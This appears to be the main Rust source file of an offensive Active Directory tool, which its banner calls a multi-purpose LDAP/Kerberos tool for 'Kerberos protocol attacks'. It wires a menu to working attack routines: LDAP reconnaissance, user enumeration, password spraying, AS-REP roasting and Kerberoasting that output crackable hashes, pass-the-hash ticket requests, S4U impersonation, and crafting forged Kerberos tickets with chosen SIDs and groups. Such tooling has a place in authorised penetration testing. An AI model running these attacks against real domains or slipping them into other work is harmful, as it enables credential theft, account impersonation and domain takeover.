const LOGO: &str = r#"
░▒▓█▓▒░  ░▒▓███████▓▒░    ░▒▓██████▓▒░    ░▒▓███████▓▒░  ░▒▓████████▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓████████▓▒░ 
░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░        
░▒▓█▓▒░ ░▒▓███████▓▒░    ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓██████▓▒░     ░▒▓██████▓▒░  ░▒▓██████▓▒░   
░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░            ░▒▓█▓▒░     ░▒▓█▓▒░        
░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓██████▓▒░   ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓████████▓▒░     ░▒▓█▓▒░     ░▒▓████████▓▒░ 

Multi-purpose LDAP/Kerberos tool | By: Evasive_Ginger
Native Cerberos library for Kerberos protocol attacks
"#;

use cerbero_lib;
use dialoguer::{theme::ColorfulTheme, Confirm, Select};
use std::net::IpAddr;
pub mod acl;
pub mod args;
pub mod commands;
pub mod deep_queries;
pub mod help;
pub mod kerberos;
pub mod ldap;
pub mod ldapping;
pub mod spray;

use crate::args::{calculate_kerberos_hash, get_cerbero_args, parse_shell_args, CerberoCommand};
use args::{
    get_connect_arguments, get_spray_arguments, get_userenum_arguments, run_nested_query_menu,
};
use help::*;
use spray::*;

const MAIN_OPTIONS: &[&str] = &[
    "Connect (LDAP Reconissance)",
    "Cerberos (Kerberos Protocol Attacks)",
    "User Enumeration (LDAP Ping Method)",
    "Password Spray (LDAP)",
    "Generate KRB5 Conf",
    "Version",
    "Help",
    "Exit",
];

const CMD_OPTIONS: &[&str] = &[
    "Get SID/GUID",
    "From SID/GUID",
    "Get SPNs",
    "Get ACE/DACL",
    "Query Groups",
    "Machine Quota",
    "Net Commands",
    "Password Policy",
    "Deep-Queries",
    "Custom Ldap Query (Bofhound Compatible)",
    "Actions",
    "Help",
    "Back",
];

fn main() {
    println!("{}", LOGO);

    loop {
        add_terminal_spacing(1);
        let selection = Select::with_theme(&ColorfulTheme::default())
            .with_prompt("Choose an option")
            .default(0)
            .items(MAIN_OPTIONS)
            .interact()
            .expect("Failed to display menu");

        match selection {
            0 => handle_connect(),
            1 => handle_cerbero(),
            2 => handle_user_enumeration(),
            3 => handle_password_spray(),
            4 => handle_krb5_config(),
            5 => println!("v{}", env!("CARGO_PKG_VERSION")),
            6 => show_help_main(),
            7 => {
                if confirm_exit() {
                    break;
                }
            }
            _ => unreachable!(),
        }
    }
}

fn handle_connect() {
    let Some(mut ldap_config) = get_connect_arguments() else {
        println!("Required arguments not provided!");
        return;
    };

    let (ldap, search_base) = match crate::ldap::ldap_connect(&mut ldap_config) {
        Ok(conn) => conn,
        Err(e) => {
            eprintln!("[!] Failed to connect to LDAP server: {}. Check credentials, Kerberos ticket, or connection.", e);
            if ldap_config.kerberos {
                eprintln!("[DEBUG] Kerberos authentication was enabled. Ensure `KRB5CCNAME` is set and contains a valid ticket.");
            } else {
                eprintln!("[DEBUG] Using simple bind with username and password.");
            }
            return;
        }
    };

    println!("\nSuccessfully connected to LDAP server.\n");
    run_command_menu(&mut ldap_config, ldap, search_base);
}

fn run_command_menu(
    ldap_config: &mut crate::ldap::LdapConfig,
    mut ldap: ldap3::LdapConn,
    search_base: String,
) {
    loop {
        let prompt = help::get_prompt_string(
            &ldap_config.username,
            &ldap_config.domain,
            ldap_config.secure_ldaps,
            &ldap_config.dc_ip,
        );

        let cmd_selection = Select::with_theme(&ColorfulTheme::default())
            .with_prompt(prompt)
            .items(CMD_OPTIONS)
            .default(0)
            .interact()
            .expect("Failed to display command menu");

        add_terminal_spacing(2);

        match cmd_selection {
            0 => handle_get_sid_guid(&mut ldap, &search_base, ldap_config),
            1 => handle_from_sid_guid(&mut ldap, &search_base, ldap_config),
            2 => {
                if let Err(e) = commands::getspns::get_service_principal_names(
                    &mut ldap,
                    &search_base,
                    ldap_config,
                ) {
                    eprintln!("Error: {}", e);
                }
            }
            3 => handle_get_acedacl(&mut ldap, &search_base, ldap_config),
            4 => handle_query_groups(&mut ldap, &search_base, ldap_config),
            5 => {
                if let Err(e) =
                    commands::maq::get_machine_account_quota(&mut ldap, &search_base, ldap_config)
                {
                    eprintln!("Error: {}", e);
                }
            }
            6 => handle_net_commands(&mut ldap, &search_base, ldap_config),
            7 => {
                if let Err(e) =
                    commands::getpasspol::get_password_policy(&mut ldap, &search_base, ldap_config)
                {
                    eprintln!("Error: {}", e);
                }
            }
            8 => {
                if let Err(e) = run_nested_query_menu(&mut ldap, &search_base, ldap_config) {
                    eprintln!("Error: {}", e);
                }
            }
            9 => {
                if let Err(e) =
                    commands::customldap::custom_ldap_query(&mut ldap, &search_base, ldap_config)
                {
                    eprintln!("Error running custom LDAP query: {}", e);
                }
            }
            10 => {
                if let Err(e) =
                    commands::actions::run_actions_menu(&mut ldap, &search_base, ldap_config)
                {
                    eprintln!("Error in actions menu: {}", e);
                }
            }
            11 => show_help_connect(),
            12 => break,
            _ => unreachable!(),
        }
    }
}

fn handle_get_sid_guid(
    ldap: &mut ldap3::LdapConn,
    search_base: &str,
    ldap_config: &crate::ldap::LdapConfig,
) {
    let target = read_input("Enter target object: ");
    if !target.is_empty() {
        if let Err(e) =
            commands::get_sid_guid::query_sid_guid(ldap, search_base, ldap_config, &target)
        {
            eprintln!("Error: {}", e);
        }
    }
}

fn handle_from_sid_guid(
    ldap: &mut ldap3::LdapConn,
    search_base: &str,
    _ldap_config: &crate::ldap::LdapConfig,
) {
    println!("SID Ex:  S-1-5-21-123456789-234567890-345678901-1001");
    println!("GUID Ex: 550e8400-e29b-41d4-a716-446655440000\n");

    let target = read_input("Enter SID/GUID: ");
    if !target.is_empty() {
        if let Err(e) = commands::from_sid_guid::resolve_sid_guid(ldap, search_base, &target) {
            eprintln!("Error: {}", e);
        }
    }
}

fn handle_query_groups(
    ldap: &mut ldap3::LdapConn,
    search_base: &str,
    ldap_config: &crate::ldap::LdapConfig,
) {
    let username = read_input(
        "Enter username to see specific user's groups (or press Enter to see all groups): ",
    );
    let export_input = read_input("Export results to file? (y/N): ");
    let export = export_input.trim().to_lowercase() == "y";
    let username = if username.is_empty() {
        None
    } else {
        Some(username.as_str())
    };

    if let Err(e) = commands::groups::query_groups(ldap, search_base, ldap_config, username, export)
    {
        eprintln!("Error: {}", e);
    }
}

fn handle_get_acedacl(
    ldap: &mut ldap3::LdapConn,
    search_base: &str,
    ldap_config: &crate::ldap::LdapConfig,
) {
    let username = read_input("Enter username to analyze: ");
    if !username.is_empty() {
        if let Err(e) =
            commands::get_acedacl::get_ace_dacl(ldap, search_base, ldap_config, &username)
        {
            eprintln!("Error: {}", e);
        }
    }
}

fn handle_net_commands(
    ldap: &mut ldap3::LdapConn,
    search_base: &str,
    ldap_config: &crate::ldap::LdapConfig,
) {
    let input = read_input(
        "Enter the net command arguments (e.g., user administrator OR group \"Domain Admins\"): ",
    );
    let args = parse_quoted_args(&input);

    if args.len() < 2 {
        eprintln!("Error: net command requires type (user/group) and name");
        eprintln!("Usage: net <user|group> <n>");
        return;
    }

    let command_type = args[0].to_lowercase();
    if !matches!(command_type.as_str(), "user" | "group") {
        eprintln!("Error: net command type must be either 'user' or 'group'");
        eprintln!("Usage: net <user|group> <n>");
        return;
    }

    let name = args[1].trim_matches('"');
    if let Err(e) = commands::net::net_command(ldap, search_base, ldap_config, &command_type, name)
    {
        eprintln!("Error: {}", e);
    }
}

fn handle_cerbero() {
    match get_cerbero_args() {
        CerberoCommand::AskTgt {
            username,
            password,
            domain,
            dc_ip,
            output,
            hash,
        } => {
            let ip: IpAddr = match dc_ip.parse() {
                Ok(ip) => ip,
                Err(_) => {
                    eprintln!("[!] Invalid IP address: {}", dc_ip);
                    return;
                }
            };

            let mut ops = crate::kerberos::KerberosOps::new(&domain, ip);

            let result = if let Some(hash_value) = hash {
                ops.ask_tgt_hash(&username, &hash_value, &output)
            } else {
                ops.ask_tgt(&username, &password, &output)
            };

            match result {
                Ok(_) => println!("\x1b[32m[+] Success\x1b[0m"),
                Err(e) => eprintln!("\x1b[31m[!] Error: {}\x1b[0m", e),
            }
        }
        CerberoCommand::AskTgs {
            username,
            password,
            domain,
            dc_ip,
            service,
            output,
        } => {
            let ip: IpAddr = match dc_ip.parse() {
                Ok(ip) => ip,
                Err(_) => {
                    eprintln!("[!] Invalid IP address: {}", dc_ip);
                    return;
                }
            };

            let mut ops = crate::kerberos::KerberosOps::new(&domain, ip);

            match ops.ask_tgs(&username, &password, &service, &output) {
                Ok(_) => println!("\x1b[32m[+] Success\x1b[0m"),
                Err(e) => eprintln!("\x1b[31m[!] Error: {}\x1b[0m", e),
            }
        }
        CerberoCommand::AskS4u2self {
            username,
            password,
            domain,
            dc_ip,
            impersonate,
            output,
        } => {
            let ip: IpAddr = match dc_ip.parse() {
                Ok(ip) => ip,
                Err(_) => {
                    eprintln!("[!] Invalid IP address: {}", dc_ip);
                    return;
                }
            };

            let mut ops = crate::kerberos::KerberosOps::new(&domain, ip);

            match ops.ask_s4u2self(&username, &password, &impersonate, &output) {
                Ok(_) => println!("\x1b[32m[+] Success\x1b[0m"),
                Err(e) => eprintln!("\x1b[31m[!] Error: {}\x1b[0m", e),
            }
        }
        CerberoCommand::AskS4u2proxy {
            username,
            password,
            domain,
            dc_ip,
            impersonate,
            service,
            output,
        } => {
            let ip: IpAddr = match dc_ip.parse() {
                Ok(ip) => ip,
                Err(_) => {
                    eprintln!("[!] Invalid IP address: {}", dc_ip);
                    return;
                }
            };

            let mut ops = crate::kerberos::KerberosOps::new(&domain, ip);

            match ops.ask_s4u2proxy(&username, &password, &impersonate, &service, &output) {
                Ok(_) => println!("\x1b[32m[+] Success\x1b[0m"),
                Err(e) => eprintln!("\x1b[31m[!] Error: {}\x1b[0m", e),
            }
        }
        CerberoCommand::AsrepRoast {
            domain,
            dc_ip,
            target,
            output,
            format,
        } => {
            use std::path::Path;

            let ip: IpAddr = match dc_ip.parse() {
                Ok(ip) => ip,
                Err(_) => {
                    eprintln!("[!] Invalid IP address: {}", dc_ip);
                    return;
                }
            };

            let ops = crate::kerberos::KerberosOps::new(&domain, ip);

            // Determine crack format
            let crack_format = if format == "john" {
                cerbero_lib::CrackFormat::John
            } else {
                cerbero_lib::CrackFormat::Hashcat
            };

            // Check if target is a file or a single user
            let hashes = if Path::new(&target).exists() {
                match ops.asreproast_file(&target, crack_format) {
                    Ok(h) => h,
                    Err(e) => {
                        eprintln!("\x1b[31m[!] Error: {}\x1b[0m", e);
                        return;
                    }
                }
            } else {
                match ops.asreproast_user(&target, crack_format) {
                    Ok(h) => vec![h],
                    Err(e) => {
                        eprintln!("\x1b[31m[!] Error: {}\x1b[0m", e);
                        return;
                    }
                }
            };

            // Output results
            if let Some(output_file) = output {
                use std::fs::File;
                use std::io::Write;

                match File::create(&output_file) {
                    Ok(mut file) => {
                        for hash in &hashes {
                            writeln!(file, "{}", hash).ok();
                        }
                        println!("\x1b[32m[+] Hashes saved to: {}\x1b[0m", output_file);
                    }
                    Err(e) => eprintln!("\x1b[31m[!] Failed to write output: {}\x1b[0m", e),
                }
            } else {
                // Print to stdout
                for hash in &hashes {
                    println!("{}", hash);
                }
            }

            if !hashes.is_empty() {
                println!("\x1b[32m[+] AS-REP roasting complete\x1b[0m");
            }
        }
        CerberoCommand::Kerberoast {
            username,
            password,
            domain,
            dc_ip,
            target,
            output,
            format,
        } => {
            use std::path::Path;

            let ip: IpAddr = match dc_ip.parse() {
                Ok(ip) => ip,
                Err(_) => {
                    eprintln!("[!] Invalid IP address: {}", dc_ip);
                    return;
                }
            };

            let mut ops = crate::kerberos::KerberosOps::new(&domain, ip);

            let crack_format = if format == "john" {
                cerbero_lib::CrackFormat::John
            } else {
                cerbero_lib::CrackFormat::Hashcat
            };

            let hashes = if Path::new(&target).exists() {
                match ops.kerberoast_file(&username, &password, &target, crack_format) {
                    Ok(h) => h,
                    Err(e) => {
                        eprintln!("\x1b[31m[!] Error: {}\x1b[0m", e);
                        return;
                    }
                }
            } else {
                // Single target (user:spn format)
                let parts: Vec<&str> = target.split(':').collect();
                if parts.len() != 2 {
                    eprintln!("\x1b[31m[!] Invalid target format. Use 'user:spn' or provide a file\x1b[0m");
                    return;
                }

                match ops.kerberoast_service(&username, &password, parts[0], parts[1], crack_format)
                {
                    Ok(h) => vec![h],
                    Err(e) => {
                        eprintln!("\x1b[31m[!] Error: {}\x1b[0m", e);
                        return;
                    }
                }
            };

            if let Some(output_file) = output {
                use std::fs::File;
                use std::io::Write;

                match File::create(&output_file) {
                    Ok(mut file) => {
                        for hash in &hashes {
                            writeln!(file, "{}", hash).ok();
                        }
                        println!("\x1b[32m[+] Hashes saved to: {}\x1b[0m", output_file);
                    }
                    Err(e) => eprintln!("\x1b[31m[!] Failed to write output: {}\x1b[0m", e),
                }
            } else {
                for hash in &hashes {
                    println!("{}", hash);
                }
            }

            if !hashes.is_empty() {
                println!(
                    "\x1b[32m[+] Kerberoast complete: {} hash(es)\x1b[0m",
                    hashes.len()
                );
            }
        }
        CerberoCommand::Convert {
            input,
            output,
            format,
        } => {
            use cerbero_lib::{CredFormat, FileVault, Vault};
            use std::path::Path;

            if !Path::new(&input).exists() {
                eprintln!("\x1b[31m[!] Input file not found: {}\x1b[0m", input);
                return;
            }

            let in_vault = FileVault::new(input.clone());

            let tickets = match in_vault.dump() {
                Ok(t) => t,
                Err(e) => {
                    eprintln!("\x1b[31m[!] Failed to read input file: {}\x1b[0m", e);
                    return;
                }
            };

            if tickets.is_empty() {
                eprintln!("\x1b[31m[!] Input file is empty or contains no valid tickets\x1b[0m");
                return;
            }

            let in_format = match in_vault.support_cred_format() {
                Ok(Some(f)) => f,
                _ => {
                    eprintln!("\x1b[31m[!] Unable to detect input file format\x1b[0m");
                    return;
                }
            };

            println!("[*] Read {} with {} format", input, in_format);

            let out_format = if let Some(fmt) = format {
                match fmt.as_str() {
                    "krb" => CredFormat::Krb,
                    "ccache" => CredFormat::Ccache,
                    "auto" => {
                        if let Some(detected) = CredFormat::from_file_extension(&output) {
                            println!(
                                "[*] Detected {} format from output file extension",
                                detected
                            );
                            detected
                        } else {
                            println!("[*] No extension detected, using opposite of input format");
                            in_format.contrary()
                        }
                    }
                    _ => {
                        eprintln!("\x1b[31m[!] Invalid format\x1b[0m");
                        return;
                    }
                }
            } else {
                if let Some(detected) = CredFormat::from_file_extension(&output) {
                    println!(
                        "[*] Detected {} format from output file extension",
                        detected
                    );
                    detected
                } else {
                    println!("[*] No extension detected, using opposite of input format");
                    in_format.contrary()
                }
            };

            let out_vault = FileVault::new(output.clone());
            match out_vault.save_as(tickets, out_format) {
                Ok(_) => {
                    println!("[*] Saved {} with {} format", output, out_format);
                    println!("\x1b[32m[+] Conversion complete\x1b[0m");
                }
                Err(e) => {
                    eprintln!("\x1b[31m[!] Failed to save output file: {}\x1b[0m", e);
                }
            }
        }
        CerberoCommand::Craft {
            user,
            sid,
            user_rid,
            service,
            key_type,
            key_value,
            groups,
            output,
            format,
        } => {
            use cerbero_lib::{
                craft_ticket_info, CredFormat, FileVault, KrbUser, TicketCreds, Vault,
            };
            use kerberos_crypto::Key;
            use ms_pac::PISID;
            use std::convert::TryInto;

            let krb_user: KrbUser = match user.as_str().try_into() {
                Ok(u) => u,
                Err(e) => {
                    eprintln!("\x1b[31m[!] Invalid user format: {}\x1b[0m", e);
                    return;
                }
            };

            let realm_sid: PISID = match sid.as_str().try_into() {
                Ok(s) => s,
                Err(_) => {
                    eprintln!("\x1b[31m[!] Invalid SID format: {}\x1b[0m", sid);
                    return;
                }
            };

            let user_key = match key_type.to_lowercase().as_str() {
                "password" => Key::Secret(key_value),
                "rc4" | "ntlm" => {
                    let key_bytes = match hex::decode(&key_value) {
                        Ok(b) => b,
                        Err(_) => {
                            eprintln!("\x1b[31m[!] Invalid RC4/NTLM hash\x1b[0m");
                            return;
                        }
                    };
                    match key_bytes.try_into() {
                        Ok(k) => Key::RC4Key(k),
                        Err(_) => {
                            eprintln!("\x1b[31m[!] RC4 key must be 16 bytes (32 hex chars)\x1b[0m");
                            return;
                        }
                    }
                }
                "aes128" => {
                    let key_bytes = match hex::decode(&key_value) {
                        Ok(b) => b,
                        Err(_) => {
                            eprintln!("\x1b[31m[!] Invalid AES128 key\x1b[0m");
                            return;
                        }
                    };
                    match key_bytes.try_into() {
                        Ok(k) => Key::AES128Key(k),
                        Err(_) => {
                            eprintln!(
                                "\x1b[31m[!] AES128 key must be 16 bytes (32 hex chars)\x1b[0m"
                            );
                            return;
                        }
                    }
                }
                "aes256" | "aes" => {
                    let key_bytes = match hex::decode(&key_value) {
                        Ok(b) => b,
                        Err(_) => {
                            eprintln!("\x1b[31m[!] Invalid AES256 key\x1b[0m");
                            return;
                        }
                    };
                    match key_bytes.try_into() {
                        Ok(k) => Key::AES256Key(k),
                        Err(_) => {
                            eprintln!(
                                "\x1b[31m[!] AES256 key must be 32 bytes (64 hex chars)\x1b[0m"
                            );
                            return;
                        }
                    }
                }
                _ => {
                    eprintln!("\x1b[31m[!] Invalid key type. Use: password, rc4, aes128, or aes256\x1b[0m");
                    return;
                }
            };

            let cred_format = match format.to_lowercase().as_str() {
                "krb" => CredFormat::Krb,
                "ccache" => CredFormat::Ccache,
                _ => {
                    eprintln!("\x1b[31m[!] Invalid format. Use 'ccache' or 'krb'\x1b[0m");
                    return;
                }
            };

            println!("[*] Crafting ticket...");

            let ticket_info = craft_ticket_info(
                krb_user.clone(),
                service.clone(),
                user_key,
                user_rid,
                realm_sid,
                &groups,
                None,
            );

            let krb_cred = TicketCreds::new(vec![ticket_info]);
            let vault = FileVault::new(output.clone());

            match vault.save_as(krb_cred, cred_format) {
                Ok(_) => {
                    if let Some(ref spn) = service {
                        println!("[*] Saved {} TGS for {} in {}", krb_user.name, spn, output);
                    } else {
                        println!("[*] Saved {} TGT in {}", krb_user.name, output);
                    }
                    println!("\x1b[32m[+] Ticket crafted successfully\x1b[0m");
                }
                Err(e) => {
                    eprintln!("\x1b[31m[!] Failed to save ticket: {:?}\x1b[0m", e);
                }
            }
        }
        CerberoCommand::Export(path) => {
            println!("[+] KRB5CCNAME environment variable set to: {}", path);
            std::env::set_var("KRB5CCNAME", path);
        }
        CerberoCommand::Hash => {
            calculate_kerberos_hash();
        }
        CerberoCommand::None => {}
    }
}

fn handle_user_enumeration() {
    let Some(args) = get_userenum_arguments() else {
        println!("Invalid arguments provided!");
        return;
    };

    println!("\nConfiguration:");
    println!("User file: {}", args.userfile);
    println!("Domain: {}", args.domain);
    println!("DC IP: {}", args.dc_ip);
    println!(
        "Output file: {}",
        args.output.as_deref().unwrap_or("None (stdout)")
    );
    if args.timestamp_format {
        println!("Timestamp formatting: Enabled");
    }

    println!("\nStarting enumeration...");
    if let Err(e) = ldapping::run(&args) {
        eprintln!("Error during enumeration: {}", e);
    }
    println!("\nUser enumeration complete.");
    add_terminal_spacing(2);
}

fn handle_password_spray() {
    let Some(args) = get_spray_arguments() else {
        println!("Required arguments not provided!");
        println!("Usage: --users <usernames/users_file> --passwords <password/passwords_file> --domain <domain> --dc-ip <ip>");
        return;
    };

    println!("Using username/users file: {}", args.userfile);
    println!("Using password/passwords file: {}", args.password);

    match SprayConfig::from_args(&args) {
        Ok(spray_config) => {
            if let Err(e) = spray::start_password_spray(spray_config) {
                eprintln!("Error during password spray: {}", e);
            }
        }
        Err(e) => eprintln!("Error parsing arguments: {}", e),
    }
}

fn handle_krb5_config() {
    println!("KRB5 Config Generator");

    let host = read_input("Enter IP address (e.g. 10.0.0.1): ");
    let hostname = read_input("Enter hostname (e.g. dc1): ");
    let domain = read_input("Enter domain (e.g. example.local): ");
    let is_dc_input = read_input("Is this a Domain Controller? (y/n): ");
    let is_dc = is_dc_input.eq_ignore_ascii_case("y");

    let args = ConfGenArgs {
        host,
        hostname,
        domain,
        is_dc,
    };
    if let Err(e) = generate_conf_files(&args) {
        eprintln!("Error generating config files: {}", e);
    }
}

fn confirm_exit() -> bool {
    match Confirm::with_theme(&ColorfulTheme::default())
        .with_prompt("Are you sure you want to quit?")
        .interact()
    {
        Ok(true) => {
            println!("Goodbye!");
            true
        }
        Ok(false) => {
            println!("Returning to the menu...");
            false
        }
        Err(_) => false,
    }
}

fn parse_quoted_args(input: &str) -> Vec<String> {
    input
        .trim()
        .split('"')
        .enumerate()
        .flat_map(|(i, s)| {
            if i % 2 == 0 {
                s.split_whitespace().map(String::from).collect()
            } else {
                vec![s.to_string()]
            }
        })
        .filter(|s| !s.is_empty())
        .collect()
}
